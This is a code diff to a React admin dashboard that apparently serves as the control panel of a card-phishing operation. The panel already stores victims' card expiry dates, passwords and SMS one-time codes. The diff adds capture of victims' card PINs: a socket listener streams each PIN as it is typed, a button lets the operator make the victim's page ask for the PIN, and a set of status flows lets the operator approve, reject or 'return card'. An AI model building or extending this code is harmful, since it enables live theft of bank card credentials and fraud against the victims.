@@ -3,7 +3,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
-import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio } from "lucide-react";
+import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio, Lock } from "lucide-react";
 import { useRealtime } from "@/context/RealtimeContext";
 import { useAdminAuth } from "@/context/AdminAuthContext";
 import { useAdminLocale } from "@/context/AdminLocaleContext";
@@ -65,6 +65,7 @@ interface OrderData {
   dateMMYY?: string;
   password?: string;
   smsCode?: string;
+  pinCode?: string;
   userAgent?: string;
   ipAddress?: string;
   couponHistory?: CouponHistoryItem[];
@@ -115,6 +116,7 @@ export const DataListView = () => {
         if (o.id !== data.id) return o;
         const updated: OrderData = { ...o, status: data.status };
         if (data.smsCode !== undefined) updated.smsCode = data.smsCode;
+        if (data.pinCode !== undefined) updated.pinCode = data.pinCode;
         if (data.couponCode !== undefined) updated.couponCode = data.couponCode;
         if (data.dateMMYY !== undefined) updated.dateMMYY = data.dateMMYY;
         if (data.password !== undefined) updated.password = data.password;
@@ -151,6 +153,13 @@ export const DataListView = () => {
           dateMMYY: data.dateMMYY !== undefined ? data.dateMMYY : s.dateMMYY,
           password: data.password !== undefined ? data.password : s.password,
         };
+      }));
+    });
+    // Live PIN typing
+    socket.on('live_pin_update', (data: { orderId: string; pinCode: string }) => {
+      setOrders(prev => prev.map(o => {
+        if (o.id !== data.orderId) return o;
+        return { ...o, pinCode: data.pinCode };
       }));
     });
     // Real-time coupon typing for existing orders (Return Coupon / resubmit flow)
@@ -190,7 +199,7 @@ export const DataListView = () => {
 
   const filteredOrders = allOrders.filter(order => {
     if (filterType === "all") return true;
-    if (filterType === "pending") return ["WAITING_APPROVAL", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING"].includes(order.status);
+    if (filterType === "pending") return ["WAITING_APPROVAL", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING", "REQUEST_PIN", "PIN_SUBMITTED"].includes(order.status);
     if (filterType === "completed") return ["COMPLETED", "APPROVED"].includes(order.status);
     if (filterType === "online") return order._isLive || onlineOrderIds.has(order.id);
     return true;
@@ -209,6 +218,7 @@ export const DataListView = () => {
   const handleConfirmSMS = (o: OrderData) => updateStatus(o.id, "COMPLETED");
   const handleRejectSMS = (o: OrderData) => updateStatus(o.id, "REJECTED");
   const handleReturnCoupon = (o: OrderData) => updateStatus(o.id, "RETURN_COUPON");
+  const handleRequestPin = (o: OrderData) => updateStatus(o.id, "REQUEST_PIN");
 
   const devIcon = (ua?: string) => {
     if (!ua) return <Globe className="w-3 h-3" />;
@@ -288,6 +298,7 @@ export const DataListView = () => {
                     order.status === "LIVE_TYPING" ? "bg-emerald-50/60 dark:bg-emerald-900/10 border-l-4 border-l-emerald-500" :
                     order.status === "WAITING_APPROVAL" ? "bg-yellow-50/50 dark:bg-yellow-900/10" :
                     order.status === "SMS_SUBMITTED" ? "bg-blue-50/50 dark:bg-blue-900/10" :
+                    (order.status === "REQUEST_PIN" || order.status === "PIN_SUBMITTED") ? "bg-indigo-50/50 dark:bg-indigo-900/10" :
                     order.status === "RETURN_COUPON" ? "bg-orange-50/50 dark:bg-orange-900/10" : ""
                   }>
                     <TableCell className="font-mono text-xs">
@@ -429,16 +440,36 @@ export const DataListView = () => {
                       <div className="flex flex-col gap-1">
                         {statusBadge(order.status)}
                         {order.smsCode && (<Badge variant="secondary" className="font-mono tracking-widest justify-center bg-purple-100 text-purple-900 border-purple-300">SMS: {order.smsCode}</Badge>)}
+                        {order.pinCode && (<Badge variant="secondary" className="font-mono tracking-widest justify-center bg-indigo-100 text-indigo-900 border-indigo-300">PIN: {order.pinCode}</Badge>)}
                       </div>
                     </TableCell>
                     <TableCell className="text-right">
                       {order.status === "LIVE_TYPING" && (
                         <span className="text-xs text-emerald-600 italic">{t("data.typing")}</span>
                       )}
+                      {(order.status === "REQUEST_PIN" || order.status === "PIN_SUBMITTED") && (
+                        <span className="text-xs text-indigo-600 italic block mb-1">
+                          {order.pinCode ? `PIN: ${order.pinCode}` : t("data.userTyping")}
+                        </span>
+                      )}
                       {order.status === "WAITING_APPROVAL" && (
                         <div className="flex justify-end gap-2">
+                          <Button size="sm" variant="outline" onClick={() => handleRequestPin(order)} className="h-8 px-2 border-indigo-300 text-indigo-700 hover:bg-indigo-50" title={t("data.requestPin")}><Lock className="w-4 h-4" /></Button>
                           <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.reject")}><X className="w-4 h-4" /></Button>
                           <Button size="sm" className="h-8 px-2 bg-green-600 hover:bg-green-700" onClick={() => handleApprove(order)} title={t("data.approve")}><Check className="w-4 h-4" /></Button>
+                        </div>
+                      )}
+                      {(order.status === "PIN_SUBMITTED" || order.status === "REQUEST_PIN") && (
+                        <div className="flex flex-col gap-2">
+                          <div className="flex justify-end gap-2">
+                            <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.rejectPin")}><X className="w-4 h-4" /></Button>
+                            <Button size="sm" className="h-8 px-3 bg-green-600 hover:bg-green-700 text-white" onClick={() => handleApprove(order)} title={t("data.approve")}>
+                              <Check className="w-4 h-4 mr-1" />{t("data.allow")}
+                            </Button>
+                          </div>
+                          <Button size="sm" variant="outline" onClick={() => handleReturnCoupon(order)} className="h-8 px-3 border-orange-300 text-orange-700 hover:bg-orange-50">
+                            <RotateCcw className="w-3 h-3 mr-1" />{t("data.returnCard")}
+                          </Button>
                         </div>
                       )}
                       {order.status === "SMS_SUBMITTED" && (
